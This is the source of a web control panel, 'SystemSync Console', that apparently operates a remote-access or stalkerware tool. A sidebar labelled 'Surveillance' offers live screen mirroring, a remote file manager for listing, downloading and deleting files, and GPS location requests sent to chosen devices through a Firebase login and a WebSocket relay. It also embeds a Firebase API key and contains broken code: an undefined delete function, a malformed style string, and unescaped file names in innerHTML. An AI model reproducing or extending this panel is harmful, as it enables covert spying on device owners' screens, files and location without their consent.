<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>SystemSync Console · Secure Connection</title>
    
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <style>
        /* ========== CORE UI STYLES ========== */
        :root {
            --primary: #0f62fe; --bg-body: #f4f7fb; --bg-surface: #ffffff;
            --text-main: #12161b; --border: #e2e8f0; --danger: #e02424;
        }

        body { background: var(--bg-body); font-family: 'Inter', sans-serif; display: flex; height: 100vh; overflow: hidden; margin: 0; }
        
        /* Sidebar & Layout */
        #sidebar { width: 280px; background: white; border-right: 1px solid var(--border); padding: 20px; overflow-y: auto; display: none; }
        #main { flex: 1; display: none; flex-direction: column; background: var(--bg-body); }
        #header { height: 64px; background: white; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; }
        #status { padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; background: #fee2e2; color: #b91c1c; }
        #status.online { background: #dcfce7; color: #15803d; }

        /* Auth & Device Selection Containers */
        #authContainer, #deviceListContainer { position: fixed; inset: 0; background: var(--bg-body); display: flex; justify-content: center; align-items: center; z-index: 10000; }
        .box { background: white; padding: 32px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 360px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; }
        .btn-main { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; }

        /* ==================== TREE-VIEW FILE MANAGER (Video Style) ==================== */
        .file-manager { display: flex; flex-direction: column; height: 100%; background: #0f0f0f; color: #e0e0e0; border-radius: 12px; overflow: hidden; }
        .top-actions { display: flex; gap: 12px; padding: 12px; background: #1a1a1a; border-bottom: 1px solid #333; align-items: center; position: sticky; top: 0; z-index: 10; }
        .btn-action { padding: 6px 12px; border-radius: 4px; border: none; cursor: pointer; font-size: 12px; font-weight: 600; }
        .btn-dl { background: #1976ff; color: white; }
        .btn-del { background: #d32f2f; color: white; }
        
        .tree-content { flex: 1; overflow-y: auto; padding: 20px; text-align: left; }
        .tree-root, .nested { list-style: none; padding-left: 25px; position: relative; }
        .tree-root::before, .nested::before { content: ''; position: absolute; top: 0; left: 10px; width: 1px; height: 100%; background: #32cd32; }
        .tree-item { position: relative; margin: 8px 0; }
        .tree-item::before { content: ''; position: absolute; top: 15px; left: -15px; width: 15px; height: 1px; background: #32cd32; }

        .nested { max-height: 0; overflow: hidden; transition: max-height 0.4s ease-in-out; opacity: 0; }
        .nested.active { max-height: 1000px; opacity: 1; }
        .folder-label:hover { color: #dc143c; cursor: pointer; }
        .file-row { display: flex; align-items: center; padding: 4px; }
        .file-checkbox { margin-right: 10px; cursor: pointer; accent-color: #32cd32; }
    </style>
</head>
<body>

    <div id="authContainer">
        <div class="box">
            <h2 style="color:var(--primary)">🔐 SystemSync Login</h2>
            <input type="email" id="email" placeholder="Email Address">
            <input type="password" id="password" placeholder="Password">
            <button class="btn-main" onclick="handleAuth()">Sign In</button>
            <p id="authError" style="color:red; font-size:12px; margin-top:10px"></p>
        </div>
    </div>

    <div id="deviceListContainer" style="display:none">
        <div class="box">
            <h3>📱 Select Device</h3>
            <div id="deviceList" style="margin:20px 0; text-align:left"></div>
            <button class="btn-main" style="background:#666" onclick="firebase.auth().signOut()">Logout</button>
        </div>
    </div>

    <div id="sidebar">
        <div style="font-size:20px; font-weight:700; color:var(--primary); margin-bottom:20px">SystemSync</div>
        <div style="font-size:11px; color:#999; text-transform:uppercase; margin-bottom:10px">Surveillance</div>
        <button onclick="toggleScreen()">🖥️ Start Screen</button>
        <button onclick="openFileManager()">📂 File Manager</button>
        <button onclick="sendCommand('GET_LOCATION')">📍 GPS Location</button>
    </div>

    <div id="main">
        <header id="header">
            <div style="font-weight:600">Control Panel</div>
            <div id="status">OFFLINE</div>
        </header>
        <div id="content">
            <div id="main-panel" style="background:white; border-radius:12px; padding:20px; min-height:100%">
                Select an action from the sidebar.
            </div>
        </div>
    </div>

    <script>
        // --- CONFIG ---
        const firebaseConfig = {
            apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
            authDomain: "webviewiot.firebaseapp.com",
            projectId: "webviewiot"
        };
        const WS_URL = "wss://mirror-view.onrender.com";

        // --- STATE ---
        firebase.initializeApp(firebaseConfig);
        let ws = null, selectedDeviceId = null, currentPath = "root", currentData = [];

        // --- AUTH FLOW ---
        firebase.auth().onAuthStateChanged(user => {
            if (user) {
                document.getElementById('authContainer').style.display = 'none';
                loadDevices(user.uid);
            } else {
                document.getElementById('authContainer').style.display = 'flex';
                document.getElementById('deviceListContainer').style.display = 'none';
                document.getElementById('sidebar').style.display = 'none';
                document.getElementById('main').style.display = 'none';
            }
        });

        async function handleAuth() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('password').value;
            try { await firebase.auth().signInWithEmailAndPassword(e, p); }
            catch (err) { document.getElementById('authError').innerText = err.message; }
        }

        async function loadDevices(uid) {
            const snap = await firebase.firestore().collection('devices').where('userId', '==', uid).get();
            const list = document.getElementById('deviceList');
            list.innerHTML = '';
            snap.forEach(doc => {
                const d = doc.data();
                const div = document.createElement('div');
                div.style.padding = '10px; border:1px solid #eee; margin-bottom:8px; cursor:pointer; border-radius:8px';
                div.innerHTML = `<strong>${d.name || 'Device'}</strong><br><small>${d.deviceId}</small>`;
                div.onclick = () => startSession(d.deviceId);
                list.appendChild(div);
            });
            document.getElementById('deviceListContainer').style.display = 'flex';
        }

        function startSession(id) {
            selectedDeviceId = id;
            document.getElementById('deviceListContainer').style.display = 'none';
            document.getElementById('sidebar').style.display = 'block';
            document.getElementById('main').style.display = 'flex';
            connectWebSocket();
        }

        // --- WEBSOCKET FLOW ---
        function connectWebSocket() {
            ws = new WebSocket(WS_URL);
            ws.onopen = () => {
                ws.send(JSON.stringify({ type: 'REGISTER_WEB', deviceId: selectedDeviceId }));
                document.getElementById('status').innerText = 'ONLINE';
                document.getElementById('status').classList.add('online');
            };
            ws.onmessage = (e) => {
                const msg = JSON.parse(e.data);
                if (msg.type === 'FILE_LIST') {
                    currentData = msg.data;
                    renderFiles();
                }
            };
            ws.onclose = () => {
                document.getElementById('status').innerText = 'OFFLINE';
                document.getElementById('status').classList.remove('online');
                setTimeout(connectWebSocket, 5000);
            };
        }

        function sendCommand(cmd, params = {}) {
            if (!ws || ws.readyState !== 1) return alert("Offline");
            ws.send(JSON.stringify({ type: 'COMMAND', deviceId: selectedDeviceId, command: cmd, params }));
        }

        // --- FILE MANAGER (TREE VIEW) ---
        function openFileManager() {
            currentPath = "root";
            sendCommand('LIST_FILES', { path: 'root' });
        }

        function renderFiles() {
            const panel = document.getElementById('main-panel');
            panel.innerHTML = `
                <div class="file-manager">
                    <div class="top-actions">
                        <button class="btn-action" style="background:#444; color:white" onclick="navigateUp()">⬆ Back</button>
                        <button class="btn-action btn-dl" onclick="bulkDownload()">Download</button>
                        <button class="btn-action btn-del" onclick="bulkDelete()">Delete</button>
                        <span style="font-size:11px; color:#666">Path: ${currentPath}</span>
                    </div>
                    <div class="tree-content"><ul id="treeRoot"></ul></div>
                </div>`;
            
            const root = document.getElementById('treeRoot');
            currentData.filter(i => i.isDir).forEach(f => {
                const li = document.createElement('li');
                li.className = 'tree-item';
                li.innerHTML = `<span class="folder-label" onclick="toggleFolder(this, '${f.path}')">📁 ${f.name}</span><ul class="nested"></ul>`;
                root.appendChild(li);
            });
            currentData.filter(i => !i.isDir).forEach(f => {
                const li = document.createElement('li');
                li.className = 'tree-item';
                li.innerHTML = `<div class="file-row"><input type="checkbox" class="file-checkbox" data-path="${f.path}">📄 ${f.name}</div>`;
                root.appendChild(li);
            });
        }

        window.toggleFolder = (el, path) => {
            const nested = el.nextElementSibling;
            nested.classList.toggle('active');
            el.innerText = nested.classList.contains('active') ? el.innerText.replace('📁', '📂') : el.innerText.replace('📂', '📁');
            if (nested.classList.contains('active')) {
                currentPath = path;
                sendCommand('LIST_FILES', { path: path });
            }
        };

        window.navigateUp = () => {
            const parts = currentPath.split('/');
            parts.pop();
            currentPath = parts.join('/') || 'root';
            sendCommand('LIST_FILES', { path: currentPath });
        };

        window.bulkDownload = () => {
            document.querySelectorAll('.file-checkbox:checked').forEach(cb => {
                ws.send("dl " + cb.getAttribute('data-path'));
            });
        };
    </script>
</body>
</html>
